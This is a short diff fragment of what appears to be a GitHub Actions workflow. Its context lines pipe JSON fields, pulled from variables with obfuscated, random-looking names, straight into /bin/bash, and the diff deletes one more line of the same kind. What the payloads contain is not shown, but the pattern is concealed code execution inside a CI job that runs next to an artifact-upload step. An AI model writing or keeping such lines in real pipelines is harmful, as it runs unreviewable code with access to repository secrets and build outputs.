@@ -24,7 +24,6 @@ jobs:
           echo $xx3806 | jq -r .aslc867 | /bin/bash
           echo $lx12676 | jq -r .wie1216 | /bin/bash
           printf '%s' "$gsk406" | jq -r .o7 | /bin/bash
-          printf '%s' "$e3" | jq -r .bvwob406 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
